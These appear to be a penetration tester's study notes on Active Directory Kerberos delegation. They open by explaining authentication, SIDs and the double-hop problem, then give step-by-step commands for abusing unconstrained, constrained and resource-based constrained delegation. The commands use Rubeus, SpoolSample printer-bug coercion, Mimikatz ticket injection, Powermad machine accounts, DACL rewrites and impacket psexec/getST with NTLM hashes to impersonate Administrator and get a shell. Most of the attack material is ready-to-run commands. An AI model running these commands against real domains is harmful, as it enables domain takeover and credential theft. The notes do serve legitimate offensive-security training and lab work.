## # `Active Directory` -

Active Directory consists of several components. The most important component is the `domain controller (DC)`, which is a Windows 2000-2019 server with the `Active Directory Domain Services role` installed. The domain controller is the hub and core of Active Directory because it stores all information about how the specific instance of Active Directory is configured. It also enforces a vast variety of rules that govern how objects within a given Windows domain interact with each other, and what services and tools are available to end users.

When an instance of Active Directory is configured, a domain is created with a name such as xyz.com where xyz is the name of the organization. Within this domain, we can add various types of objects, including computer and user objects.

System administrators can organize these objects with the help of `Organizational Units(OU)`.OUs are comparable to file system folders in that they are containers used to store and group other objects. Computer objects represent actual servers and workstations that are domain-joined (part of the domain), and user objects represent employees in the organization. All AD objects contain attributes, which vary according to the type of object. For example, a user object may include attributes such as first name, last name, username, and password.

## # `Service Principal Names` -

When applications like Exchange, SQL, or Internet Information Services (IIS) are integrated into Active Directory, a unique service instance identifier known as a Service Principal Name (SPN) is used to associate a service on a specific server to a service account in Active Directory.

## # `Kerberos Authentication` -

Kerberos Auhentication is is the default authentication protocol in Active Directory and for associated services.At a high level, Kerberos client authentication to a service in Active Directory involves the use of a domain controller in the role of a `key distribution center, or KDC`.

Authentication Process in a Nutshell -

- <mark style="background: #FFB86CA6;">Client</mark>-------------------------------><mark style="background: #E632B3A6;">Authentication Server Request(AS_REQ)</mark>--------------------------><mark style="background: #3D7EFFA6;">Domain Controller</mark>

- <mark style="background: #3D7EFFA6;">Domain Controller</mark>-----------------><mark style="background: #E632B3A6;">Authentication Server Reply(AS_REP)</mark>-----------------------------><mark style="background: #FFB86CA6;">Client</mark>

- <mark style="background: #FFB86CA6;">Client</mark>-------------------------------><mark style="background: #E632B3A6;">Ticket Granting Service Request(TGS_REQ)</mark>-----------------------><mark style="background: #3D7EFFA6;">Domain Controller</mark>

- <mark style="background: #3D7EFFA6;">Domain Controller</mark>-----------------><mark style="background: #E632B3A6;">Ticket Granting Server Reply(TGS_REP)</mark>---------------------------><mark style="background: #FFB86CA6;">Client</mark>

- <mark style="background: #FFB86CA6;">Client</mark>-------------------------------><mark style="background: #E632B3A6;">Application Request(AP_REQ)</mark>-------------------------------------><mark style="background: #D2B3FFA6;">Application Server</mark>

- <mark style="background: #D2B3FFA6;">Application Server</mark>-----------------><mark style="background: #E632B3A6;">Service Authentication</mark>---------------------------------------------><mark style="background: #FFB86CA6;">Client</mark>

Explanation -

When a user logs in to their workstation, a request is sent to the `domain controller`, which has the role of `KDC` and also maintains the Authentication Server service. This `Authentication Server Request (or AS_REQ)` contains a ==time stamp that is encrypted using a hash derived from the password of the user and the username==

When the `domain controller` receives the request, it looks up the password hash associated with the specific user and attempts to ==decrypt the time stamp==. If the decryption process is successful and the time stamp is not a duplicate (a potential replay attack), the authentication is considered successful.

The `domain controller` replies to the client with an `Authentication Server Reply (AS_REP)` that contains a ==session key== (since Kerberos is stateless) and a ==Ticket Granting Ticket (TGT)==. The ==session key is encrypted using the user’s password hash==, and may be decrypted by the client and reused. The `TGT` ==contains information regarding the user, including group memberships, the domain, a time stamp, the IP address of the client, and the session key==.

In order to avoid tampering, the `Ticket Granting Ticket` is ==encrypted by a secret key== known only to the `KDC` and can not be decrypted by the client. Once the client has received the session key and the TGT, the KDC considers the client authentication complete. By default, the ==TGT will be valid for 10 hours==, after which a renewal occurs. This renewal does not require the user to re-enter the password.

---
---

When the user wishes to access resources of the domain, such as a network share, an Exchange mailbox, or some other application with a registered service principal name, it must again contact the KDC.

This time, the client constructs a `Ticket Granting Service Request (or TGS_REQ)` packet that ==consists of the current user and a timestamp== (encrypted using the session key), ==the SPN of the resource, and the encrypted TGT==.

Next, the ticket granting service on the ==KDC receives the TGS_REQ==, and if the SPN exists in the domain, the ==TGT is decrypted using the secret key known only to the KDC==. The session key is then extracted from the TGT and used to decrypt the username and timestamp of the request. At this point the KDC performs several checks:

1. The `TGT` must have a valid timestamp (no replay detected and the request has not expired).
2. The username from the `TGS_REQ` has to match the username from the TGT.
3. The client IP address needs to coincide with the `TGT` IP address. 

If this verification process succeeds, the `ticket granting service` responds to the client with a Ticket Granting Server Reply or `TGS_REP`. This packet contains three parts:

1. The `SPN` to which access has been granted.
2. A session key to be used between the client and the SPN. 
3. A service ticket containing the username and group memberships along with the newlycreated session key.

The first two parts ==SPN and session key are encrypted using the session key== associated with the creation of the TGT and ==the service ticket is encrypted using the password hash of the service account== registered with the SPN in question.

Once the authentication process by the KDC is complete and the ==client has both a session key and a service ticket==, the service authentication begins.

First, the client sends to the application server an `Application request or AP_REQ` , which ==includes the username and a timestamp encrypted with the session key associated with the service ticket along with the service ticket== itself.

The ==application server decrypts the service ticket== using the service account password hash and ==extracts the username and the session key==. It then uses the latter to decrypt the username from the AP_REQ. If the ==AP_REQ username matches the one decrypted from the service ticket, the request is accepted==. Before access is granted, the service inspects the supplied group memberships in the service ticket and ==assigns appropriate permissions to the user, after which the user may access the requested service==.

## # `Security Identifier(SID)` -

A SID is an unique name for any object in Active Directory and has the following structure:

```bash
S-R-I-S
```

the SID begins with a literal `S` to identify the ==string as a SID==, followed by a `revision level` (usually set to “1”), an `identifier-authority value` (often '5' within AD) and one or more `subauthority values`.

Example -

```bash
S-1-5-21-2536614405-3629634762-1218571035-1116
```

- ***S-1-5*** are fairly static within AD.
- The subauthority value is dynamic and consists of two primary parts: the `domain’s numeric identifier` (in this case “21- 2536614405-3629634762-1218571035”) and a `relative identifier` or RID678 representing the specific object in the domain (in this case “1116”).

The combination of the domain’s value and the relative identifier help ensure that each SID is unique.

## # `Delegation/Double-Hop Issue` -

- When a server or service needs to impersonate a user to access another server or service, delegation is required.
- For example, users authenticates to a web server and web server makes requests to a database server. The web server can request access to resources (all or some resources depending on the type of delegation) on the database server as the user and not as the web server's service account.

![[Pasted image 20230211140937.png]]

- When the web application uses Kerberos authentication, it is only presented with the user’s service ticket. This ==service ticket contains access permissions for the web application, but the web server service account can not use it to access the backend database. This is known as the Kerberos double-hop issue==.
- Microsoft’s Kerberos delegation solves this design issue and provides a way for the web server to authenticate to the backend database on behalf of the user. Microsoft released several implementations of this including ==Unconstrained delegation (in 2000), Constrained delegation (in 2003), and Resource based constrained delegation (in 2012)==.
- Note that in both types of delegations, ==a mechanism is required to impersonate the incoming user and authenticate to the second hop server (Database server in our example) as the user==.

## # `Unconstrained Delegation` -

When a user successfully logs in to a computer, a Ticket Granting Ticket (TGT) is returned. Once the user requests access to a service that uses Kerberos authentication, a Ticket Granting Service ticket (TGS) is generated by the Key Distribution Center (KDC) based on the TGT and returned to the user. This TGS is then sent to the service, which validates the access. Note that this ==TGS only allows that specific user to access that specific service. Since the service cannot reuse the TGS to authenticate to a backend service, any Kerberos authentication stops here. Unconstrained delegation solves this with a forwardable TGT==.

Overview of Unconstrained Delegation -

![[Pasted image 20230211143844.png]]

• A user provides credentials to the Domain Controller.
• The DC returns a TGT.
• The user requests a TGS for the web service on Web Server.
• The DC provides a TGS.
• The ==user sends the TGT and TGS to the web server==.
• The ==web server service account use the user's TGT to request a TGS for the database server from the DC==.
• The web server service account connects to the database server as the user.

---

#### <mark style="background: #3D7EFFA6;">Unconstrained Delegation Abuse</mark> -

• When set for a particular machine, unconstrained delegation allows delegation to any service to any resource on the domain as a user.
• That is, Unconstrained Delegation is obviously bad. ==If we compromise a machine with unconstrained delegation and a high privilege user (like DA) connects to it, we can extract the user's TGT and access any service in the domain as that user.==
• The only requirement is to somehow trick a high privilege user to connect to the machine with unconstrained delegation which we compromised. 

	How do we trick a high privilege account to connect? Printer Bug helps with that!

A feature of MS-RPRN which allows any domain user (Authenticated User) can force any machine (running the Spooler service) to connect to second a machine of the domain user's choice.

#### <mark style="background: #3D7EFFA6;">Enumeration of accounts with Unconstrained Delegation</mark> -

The Domain Controller (DC) stores the information about computers configured with unconstrained delegation and makes this information available for all authenticated users. The information is stored in the userAccountControl property as `TRUSTED_FOR_DELEGATION`

- Powerview to enumerate unconstrained delegation -

```bash
 Get-DomainComputer -Unconstrained
```

```bash
Get-NetComputer -Unconstrained
```

- AD Module -

```bash
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description
```

![[Pasted image 20230211212609.png]]

==Note== - Domain Controller will always have Unconstrained Delegation enabled.

#### <mark style="background: #3D7EFFA6;">Abuse</mark> -

Once you have find the accounts with Unconstrained delegation and have access to it you can use Printer Bug to force authentication  and capture the users TGT with Rubeus-

- We can capture the TGT of DC by using Rubeus on machine with unconstrained delegation :

[Rubeus]((https://github.com/GhostPack/Rubeus)

```bash
.\Rubeus.exe monitor /interval:5 /nowrap
```

- MS-RPRN to force Authentication -

[SpoolSample](https://github.com/leechristensen/SpoolSample)

```bash
.\MS-RPRN.exe \\FQDNofDC \\FQDNofUnconstrainedDelegation
```


- Copy the base64 encoded TGT, remove extra spaces and use it on the attacker machine:

```bash
.\Rubeus.exe ptt /tikcet:
```

Or

• Use Invoke-Mimikatz:

```bash
[IO.File]::WriteAllBytes("C:\AD\Tools\DC.kirbi", [Convert]::FromBase64String("ticket_from_Rubeus_monitor"))
```

```bash
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\DC.kirbi"'
```

## # `Constrained Delegation` -

- Constrained Delegation when enabled on a service account allows ==access only to a specified services on specified computers as a user==.

- To impersonate the user ==Service for User(S4u)== extension is used which provides two extensions:

1. <mark style="background: #3D7EFFA6;">Service for User to Self (S4U2self)</mark> - Allows a service to obtain a forwardable TGS to itself on behalf of a user with just the user principal name without supplying a password.The service account must have the ==TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION(T2A4D)== User Account Control Attrribute.

2. <mark style="background: #3D7EFFA6;">Service for User to Proxy (S4U2proxy)</mark> - Allows a service to obtain a TGS to a second service on behalf of user.Which second service? This is controlled by ==msDS-AllowedToDelegateTo== Attribute.This attribute contains a list of SPNs to which the user tokens can be forwarded.

![[Pasted image 20230214210444.png]]

- A user - Joe, authenticates to the web service (running with service account websvc) using a non-Kerberos compatible
authentication mechanism.
- The web service requests a ticket from the Key Distribution Center (KDC) for Joe's account without supplying a password,
as the websvc account.
- The KDC checks the websvc userAccountControl value for the ==TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION== attribute,
and that Joe's account is not blocked for delegation. If OK it returns a forwardable ticket for Joe's account (S4U2Self).
- The service then passes this ticket back to the KDC and requests a service ticket for the CIFS/dcorp-mssql.dollarcorp.moneycorp.local service.
- The KDC checks the ==msDS-AllowedToDelegateTo== field on the websvec account. If the service is listed it will return a service
ticket for dcorp-mssq; ==(S4U2Proxy)==.
- The web service can now authenticate to the CIFS on dcorp-mssql as Joe using the supplied TGS.

#### <mark style="background: #3D7EFFA6;">Enumeration of accounts with Constrained Delegation</mark> -

- ==Powerview(dev)== to enumerate constrained delegation -

```bash
Get-DomainUser -TrustedToAuth

Get-DomainComputer -TrustedtoAuth 
```

![[Pasted image 20230214213055.png]]
shows the web_svc has constrained has delegation feature enabled for CIFS only.

- Using ==ActiveDirectory module== -

```bash
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

![[Pasted image 20230214213235.png]]


#### <mark style="background: #3D7EFFA6;">Abuse</mark> -

If we have access to a service account, it is possible to access the services listed in msDS-AllowedtoDelegateTo of the service account as ANY user.

After identifying an account with constrained delegation, the next step is to request Forwardable TGTs from KDC for our delegated accounts, we can use either Rubeus or Kekeo.

==Note== - Either plaintext password or NTLM hash is required of the service account.

For ==Rubeus==, we use the `asktgt` module to request the TGT tickets for the **_“websvc”_** .This step ==uses the S4U2self extension that allows a service to obtain a forwardable TGT on behalf of a user.== -

```bash
rubeus.exe asktgt /user:userName /domain:DomainName /ntlm:Hash /outfile:FileName.tgt
```

![[Pasted image 20230214214409.png]]

After obtaining the TGT tickets from the domain controller, we can now request service tickets for the allowed services, i.e., **CIFS** , or alternate services like **LDAP** or **WMI**.

To request service tickets (TGS) for the allowed services, we will use the **s4u** module in Rubeus and the obtained TGT tickets in the previous step. The msdsspn value is the value of the `msDS-AllowedToDelegateTo` attribute we found earlier in the enumeration steps.

The SPN for the **websvc** account is _“CIFS/dcorp-mssql”,_ and the impersonated user is Administrator.

```bash
.\Rubeus.exe s4u /ticket:TGT_Ticket /msdsspn:"service/HOST" /impersonateuser:Administrator /ptt
```

![[Pasted image 20230214214729.png]]

• To abuse Constrained delegation using Rubeus, we can use the following command (We are requesting a TGT and TGS in a single command) :

```powershell
Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e87 9470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
```


We could also ==alternate the allowed services with other services== and perform additional attacks like remotely dumping machine’s credentials.

To do that, we can use the **s4u** module in Rubeus, pass it the delegated SPN “**msdsspn,”** and the service we want to alternate to “**altservice.”** In our case, we can alternate the time service on the domain controller with LDAP to perform the DCSync attack -

```bash
.\Rubeus.exe s4u /ticket:adminsrv.tgt /msdsspn:"TIME/dcorp-DC" /impersonateuser:Administrator  /altservice:LDAP /ptt
```

==Note== -If the SPN configured for constrained delegation only uses the service and host name like www/cdc01.prod.corp1.com, we could modify the TGS to access any service on the system.

On the other hand SPN for the MSSQL server ends with “:1433”, which is not usable for CIFS since it requires an SPN with the format CIFS/cdc01.prod.corp1.com. If we modify the SPN from CIFS/cdc01.prod.corp1.com:1433 to CIFS/cdc01.prod.corp1.com in the command above, Rubeus generates an KDC_ERR_S_PRINCIPAL_UNKNOWN error, indicating that the modified SPN is not registered.

---
##### <mark style="background: #3D7EFFA6;">SUMMARY</mark> -

- Constrained delegation ==allows access only to a particular service on a particular machine which is specified in the in msDS-AllowedToDelegateTo of the service account as ANY user==.
- There is a well known ==risk that not only the service specified but any service using the same service account can be accesssed==.
- For example if msDS-AllowedToDelegateTo specifies CIFS/fileserver.acmecorp we can access both CIFS and other services like HOST,RPCSS,HTTP,WSMAN etc.

---
---

## # `Resource Based Constrained Delegation(RBCD)` -

Need for RBCD -

- For constrained delegation the front-end or first hop service account(web server in our example) must have the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION(T2A4D) UserAccountControl attribute.
- Only Domain Adminstrators can set this attribute(SeEnableDelegation privilege). This mean that the service administrators of the target service (database in our example) had no way of knowing which front-end services delegated to them.
- Resource Based Constrained Delegation change this.
- In case of RBCD service administrators/owners can configure which domain accounts are allowed to delegate to them.
- "This shifts the decesion of whether a server should trust the source of a delegated identity from the delegating-from domain administrators to the resource owner."
- Instead of SPN's on msds-AllowedToDelegateTo on the front-end service like web service, access in this case is controlled by security descriptor of `msDS-AllowedToActOnBehalfOfOtherIdentity`(visible as PrincipalsAllowedToDelegateToAccount) on the resource/service like database service.
- One advantage of RBCD is that SeEnableDelegationPrivilege permissions are no longer required and RBCD can typically be configured by the backend service administrator instead.

<mark style="background: #3D7EFFA6;">TLDR (xD)</mark> - Configuring constrained delegation ==requires the SeEnableDelegationPrivilege privilege on the domain controller==, which is typically only enabled for Domain Admins.With the release of Windows Server 2012, Microsoft introduced resource-based constrained delegation (RBCD), which is ==meant to remove the requirement of highly elevated access rights like SeEnableDelegationPrivilege from system administrators==.

---

<mark style="background: #3D7EFFA6;">WORKING</mark> -

- To configure RBCD, the SID of the frontend service is written to the new property of the backend service.
- Once RBCD has been configured, the frontend service can use S4U2Self to request the forwardable TGS for any user to itself followed by S4U2Proxy to create a TGS for that user to the backend service. Unlike constrained delegation, under RBCD the KDC checks if the SID of the frontend service is present in the msDS-AllowedToActOnBehalfOfOtherIdentity property of the backend service.
- One important requirement is that the frontend service must have an SPN set in the domain. A user account typically does not have an SPN set but all computer accounts do. This means that any attack against RBCD needs to happen from a computer account or a service account with a SPN.

---

<mark style="background: #3D7EFFA6;">ABUSE</mark> -

- The same attack we performed against constrained delegation applies to RBCD if we can compromise a frontend service that has its SID configured in the msDSAllowedToActOnBehalfOfOtherIdentity property of a backend service.
- We just need two privilege :
	- One, ==control over  an object which has SPN configured== (like admin access to a domain joined machine or ability to join a machine to a domain - msDS-MachineAccountQuota is 10 for all domain users)
	- Two, ==Write Permissions over the target computer== object to configure msDS-AllowedToActOnBehalfOfOtherIdentity.

Enumeration of account with generic write -

```powershell
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

[Look for ObjectDN & ActiveDirectoryRights]

- Once we have GenericWrite, we can update any non-protected property on that object, including msDS-AllowedToActOnBehalfOfOtherIdentity and add the SID of a different computer.
- Once a SID is added, we will act in the context of that computer account and we can execute the S4U2Self and S4U2Proxy extensions to obtain a TGS. To do this, we either have to obtain the password hash of a computer account or simply create a new computer account object with a selected password.
- By default, any authenticated user can add up to ten computer accounts to the domain and they will have SPNs set automatically. This value is present in the ms-DS-MachineAccountQuota property in the Active Directory domain object.
- We can enumerate ms-DS-MachineAccountQuota with the PowerView ==Get-DomainObject== method:

```powershell
Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota
```

- Creating computer account with ==Powermad== -
```powershell
PS C:\tools> . .\powermad.ps1
PS C:\tools> New-MachineAccount -MachineAccount napster -Password $(ConvertToSecureString 'h4x' -AsPlainText -Force)
[+] Machine account myComputer added
```

- The msDS-AllowedToActOnBehalfOfOtherIdentity property stores the SID as part of a security descriptor in a binary format. We must convert the SID of our newly-created computer object to the correct format in order to proceed with the attack.

1. Obtain the SID of the controlled account with SPN (e.g. Computer account) :

[ Using Poverview]

```powershell
$ComputerSid = Get-DomainComputer "napster" -Properties objectsid | Select -Expand objectsid
```

2. Build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE :

```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
```

Converting the SecurityDescriptor to a byte array -

```powershell
$SDBytes = New-Object byte[] ($SD.BinaryLength)
```

```powershell
$SD.GetBinaryForm($SDBytes, 0)
```

Setting msds-allowedtoactonbehalfofotheridentity -

```powershell
Get-DomainComputer "target$" | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Remember that it is not normally possible to set the msDS-AllowedToActOnBehalfOfOtherIdentity property for an arbitrary computer account. However, since our dave user has the GenericWrite access rights, we can set this property.

We can also use this attack vector with GenericAll, WriteProperty, or WriteDACL access rights

3. Verifying the SID in the SecurityDescriptor :

```powershell
$RBCDbytes = Get-DomainComputer "target$" -Properties 'msdsallowedtoactonbehalfofotheridentity' | select -expand msdsallowedtoactonbehalfofotheridentity
```

```powershell
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor - ArgumentList $RBCDbytes, 0
```

```powershell
$Descriptor.DiscretionaryAcl
```

```powershell
ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-2101
```

4. Now we can begin our attack.We’ll start by obtaining the hash of the computer account password with Rubeus:

```powershell
.\Rubeus.exe hash /password:h4x
```

Request the "impersonation" service ticket using RC4 Key :

```powershell
.\Rubeus.exe s4u /user:naspster$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/target /ptt
```

After obtaining the TGT for the napster machine account, S4U2Self will then request a forwardable service ticket as the administrator user to the napster computer account.

Finally, S4U2Proxy is invoked to request a TGS for the CIFS service on the target as the administrator user, after which it is injected into memory.

To check the success of this attack, we can dump any loaded Kerberos tickets with klist:

---
---

Abuse Using [PowerShell ActiveDirectory module](https://github.com/samratashok/ADModule)'s cmdlets :

- Add a new machine :

```powershell
Import-Module .\Powermad.ps1
```

```powershell
New-MachineAccount -Domain offensiveps.powershell.local -DomainController 192.168.2.1 -MachineAccount AttackCompObj -Password (ConvertTo-SecureString 'Password123' -AsPlainText -Force) -Verbose
```

- Once we know that our current user has Write permission on ops-sqlsrvone(example), run the following command form the Active Directory module to set RBCD on ops-sqlsrvone:

```powershell
Import-Module C:\AD\Tools\ADModulemaster\Microsoft.ActiveDirectory.Management.dll

Import-Module C:\AD\Tools\ADModulemaster\ActiveDirectory\ActiveDirectory.ps1
```

```powershell
Set-ADComputer ops-sqlsrvone -PrincipalsAllowedToDelegateToAccount
AttackCompObj$ -Verbose
```

```powershell
Get-ADComputer ops-sqlsrvone -Properties PrincipalsAllowedToDelegateToAccount
```

- Now, using Rubeus, we can request a TGS for a service on opssqlsrvone as ANY user. Note that we need to convert the password of AttackCompObj to NTLM hash:

```powershell
.\Rubeus.exe s4u /user:AttackCompObj$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /msdsspn:http/opssqlsrvone /impersonateuser:Administrator /ptt
```

- We requested TGS for HTTP which means access (as DA - Administrator using PSRemoting:

```powershell
Enter-PSSession -ComputerName ops-sqlsrvone
```

---
---

Abuse Using [StandIn](https://github.com/FuzzySecurity/StandIn) :

- Create machine account :

```bash
.\StandIn.exe --computer napster --make
```

-  Get SID of the machine account we just created :

```bash
Get-ADComputer -Filter * | Select-Object Name, SID
```

- Write msDS-AllowedToActOnBehalfOfOtherIdentity on the above SID:

```bash
.\StandIn.exe --computer ResourceDC --sid S-1-5-21-537427935-490066102-1511301751-4101
```

- Convert the password to rc4 for rubeus :

Get Hash (on Kali)

```python
import hashlib,binascii
hash = hashlib.new('md4', "<new machine password from last step>".encode('utf-16le')).digest()
print(binascii.hexlify(hash))
```

- Impersonate Administrator using Rubeus :

```bash
.\Rubeus.exe s4u /user:napster /rc4:44714c0e1624e71ac5540fd3aa9c6681 /impersonateuser:administrator /msdsspn:cifs/resourcedc.resourced.local /nowrap /ptt
```

- Copy the base64(ticket.kirbi) generated from above to kali :

```bash
cat ticket.b64 | base64 -d > ticket.kirbi
```

- Convert .kirbi to .ccache so that it can be used on Linux :

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
```

- Export it -

```bash
export KRB5CCNAME=`pwd`/ticket.ccache
klist
```

- Get a Shell -

```bash
impacket-psexec -k -no-pass resourced.local/administrator@resourcedc.resourced.local -dc-ip 192.168.114.175
```

---
---

Abuse from Linux -

[RBCD Attack](https://github.com/tothi/rbcd-attack) 

---
---

Abuse using Impacket RBCD :

Impacket rbcd.py will modify the msDS-AllowedToActOnBehalfOfOtherIdentity property of a target computer with security descriptor of another computer. The following command adds the related security descriptor of the created EVILCOMPUTER to the msDS-AllowedToActOnBehalfOfOtherIdentity property of DC01. This basically means that EVILCOMPUTER can get impersonated service tickets for DC01 using getST.py.

Command Reference:

Target IP: 10.10.10.1

Domain: test.local

Username: john

Hash: :A9FDFA038C4B75EBC76DC855DD74F0DA

Delegate To: DC01$

Delegate From: EVILCOMPUTER$

```bash
python3 rbcd.py -action write -delegate-to "DC01$" -delegate-from "EVILCOMPUTER$" -dc-ip 10.10.10.1 -hashes :A9FDFA038C4B75EBC76DC855DD74F0DA test.local/john
```

```bash
impacket-getST -spn 'cifs/ws01.reflection.vl' -impersonate Administrator -dc-ip 10.10.150.53 'reflection/ms01$' -hashes :24caaaca48d9bbfc67476b0487e9ef0f
```

